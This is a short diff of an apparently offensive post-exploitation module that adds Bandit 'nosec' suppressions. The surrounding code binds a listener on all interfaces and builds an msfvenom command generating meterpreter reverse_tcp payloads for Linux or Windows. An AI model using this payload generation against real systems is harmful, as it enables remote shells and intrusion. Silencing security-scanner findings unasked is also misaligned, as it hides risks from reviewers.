@@ -143,7 +143,7 @@ class AgentRelay(BaseModule):
             return False
 
         self._handler.on_output = on_output
-        server = http.server.HTTPServer(("0.0.0.0", port), self._handler)
+        server = http.server.HTTPServer(("0.0.0.0", port), self._handler)  # nosec B104
 
         if protocol == "https":
             if not certfile or not keyfile:
@@ -347,7 +347,7 @@ while($true) {{
             fmt = "elf" if platform == "linux" else "exe"
             msf_payload = ("linux/x64/meterpreter/reverse_tcp" if platform == "linux"
                           else "windows/x64/meterpreter/reverse_tcp")
-            outfile = f"/tmp/payload.{fmt}"
+            outfile = f"/tmp/payload.{fmt}"  # nosec B108
             cmd = ["msfvenom", "-p", msf_payload,
                    f"LHOST={lhost}", f"LPORT={lport}",
                    "-f", fmt, "-o", outfile]
